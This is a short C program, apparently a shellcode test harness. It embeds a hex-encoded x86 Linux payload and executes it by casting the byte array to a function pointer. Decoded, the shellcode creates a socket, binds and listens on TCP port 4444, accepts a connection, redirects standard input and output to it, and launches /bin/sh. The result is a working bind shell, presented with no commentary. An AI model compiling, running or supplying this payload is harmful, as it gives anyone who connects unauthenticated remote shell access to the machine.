#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xeb\x74\x5e\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x66\xff\x36\xb0\x02\x66\x50\x89\xe2\x6a\x10\x52\x66\xff\x37\x31\xc0\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x01\x66\xff\x37\xcd\x80\x31\xc0\x31\xdb\x50\x53\x57\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xdb\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\x87\xff\xff\xff\x11\x5c";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	